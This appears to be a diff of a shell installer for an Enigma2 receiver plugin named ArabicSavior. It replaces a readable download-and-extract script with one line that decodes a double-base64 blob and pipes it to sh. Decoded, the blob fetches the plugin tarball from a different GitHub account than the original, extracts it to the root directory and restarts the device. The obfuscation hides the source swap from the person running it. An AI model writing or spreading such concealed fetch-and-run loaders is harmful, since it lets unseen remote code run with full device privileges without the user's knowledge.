@@ -1,48 +1,6 @@
 #!/bin/sh
-##setup command=wget https://raw.githubusercontent.com/abo-barby/ArabicSavior/main/installer.sh -O - | /bin/sh
-
-version=1.9
-
-# remove old version
-if [ -f /var/lib/dpkg/status ]; then
-   apt-ger -r enigma2-plugin-extensions-arabicsavior
-else
-   opkg remove enigma2-plugin-extensions-arabicsavior
-fi
-
-cd /tmp
-rm -f *ArabicSavior*
-# Download new version
-wget "https://raw.githubusercontent.com/abo-barby/ArabicSavior/main/ArabicSavior-"$version".tar.gz"
-
-# remove old version
-rm -r /usr/lib/enigma2/python/Plugins/Extensions/ArabicSavior > /dev/null 2>&1
-
-# Install new version
-tar -xzf ArabicSavior-"$version".tar.gz -C /
-set +e
-rm -f *ArabicSavior*
-cd ..
-
-sync
-echo "#########################################################"
-echo "#      ArabicSavior INSTALLED SUCCESSFULLY              #"
-echo "#                 mfaraj57  &  RAED                     #"                       
-echo "#########################################################"
-echo "#           your Device will RESTART Now                #"
-echo "#########################################################"
-sleep 3
-killall -9 enigma2
-exit 0
-
-
-
-
-
-
-
-
-
+##
+echo "ZWNobyAiZG1WeWMybHZiajB4TGprS0l5QnlaVzF2ZG1VZ2IyeGtJSFpsY25OcGIyNGdJd3BwWmlCYklDMW1JQzkyWVhJdmJHbGlMMlJ3YTJjdmMzUmhkSFZ6SUYwN0lIUm9aVzRLSUNBZ1lYQjBMV2RsY2lBdGNpQmxibWxuYldFeUxYQnNkV2RwYmkxbGVIUmxibk5wYjI1ekxXRnlZV0pwWTNOaGRtbHZjZ3BsYkhObENpQWdJRzl3YTJjZ2NtVnRiM1psSUdWdWFXZHRZVEl0Y0d4MVoybHVMV1Y0ZEdWdWMybHZibk10WVhKaFltbGpjMkYyYVc5eUNtWnBDZ3BqWkNBdmRHMXdDbkp0SUMxbUlDcEJjbUZpYVdOVFlYWnBiM0lxQ2lNZ1JHOTNibXh2WVdRZ2JtVjNJSFpsY25OcGIyNEtkMmRsZENBaWFIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDJWdGFXd3lNemN2Y0d4MVoybHVjeTl0WVdsdUwwRnlZV0pwWTFOaGRtbHZjaTBpSkhabGNuTnBiMjRpTG5SaGNpNW5laUlLQ2lNZ2NtVnRiM1psSUc5c1pDQjJaWEp6YVc5dUNuSnRJQzF5SUM5MWMzSXZiR2xpTDJWdWFXZHRZVEl2Y0hsMGFHOXVMMUJzZFdkcGJuTXZSWGgwWlc1emFXOXVjeTlCY21GaWFXTlRZWFpwYjNJZ1BpQXZaR1YyTDI1MWJHd2dNajRtTVFvS0l5Qkpibk4wWVd4c0lHNWxkeUIyWlhKemFXOXVDblJoY2lBdGVIcG1JRUZ5WVdKcFkxTmhkbWx2Y2kwaUpIWmxjbk5wYjI0aUxuUmhjaTVuZWlBdFF5QXZDbk5sZENBclpRcHliU0F0WmlBcVFYSmhZbWxqVTJGMmFXOXlLZ3BqWkNBdUxnb0tjM2x1WXdwbFkyaHZJQ0lqSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNaUNtVmphRzhnSWlNZ0lDQWdJQ0JCY21GaWFXTlRZWFpwYjNJZ1NVNVRWRUZNVEVWRUlGTlZRME5GVTFOR1ZVeE1XU0FnSUNBZ0lDQWdJQ0FnSUNBZ0l5SUtaV05vYnlBaUl5QWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2JXWmhjbUZxTlRjZ0lDWWdJRkpCUlVRZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWpJaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0NtVmphRzhnSWlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5SUtaV05vYnlBaUl5QWdJQ0FnSUNBZ0lDQWdlVzkxY2lCRVpYWnBZMlVnZDJsc2JDQlNSVk5VUVZKVUlFNXZkeUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWpJZ3BsWTJodklDSWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1pQ25Oc1pXVndJRE1LWlhocGRDQXdDZz09IiB8IGJhc2U2NCAtZCB8IHNoCgo=" | base64 -d | sh
 
 
 
